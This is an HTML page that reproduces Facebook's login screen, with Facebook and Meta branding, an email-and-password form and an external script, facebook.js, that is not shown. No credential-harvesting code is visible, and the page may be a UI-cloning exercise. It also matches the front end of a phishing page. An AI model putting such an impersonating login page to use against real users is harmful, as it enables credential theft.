<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - log in or sign up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<main class="split-screen">
    <div class="left-panel">
        <img src="pic/Screenshot 2026-03-31 170932.png" alt="Explore the things you love">
    </div>

    <div class="right-panel">
        <div class="form-wrapper">
            <h2 class="login-header">Log into Facebook</h2>
            
            <form class="login-box" id="loginForm">
                <input type="text" id="email" placeholder="Email or mobile number" required />
                <input type="password" id="password" placeholder="Password" required />
                
                <button type="submit" class="login-btn">Log in</button>
                
                <a href="#" class="forgot-link">Forgot password?</a>
                
                <div class="create-section">
                    <button type="button" class="create-btn-outline">Create new account</button>
                </div>
            </form>
            
            <div class="meta-footer">
                <img src="pic/64fa5f3e37ba6791a9868c46_meta logo png.png" alt="Meta Logo" class="meta-logo-img">
            </div>
        </div>
    </div>
</main>

<script src="facebook.js"></script>
</body>
</html>
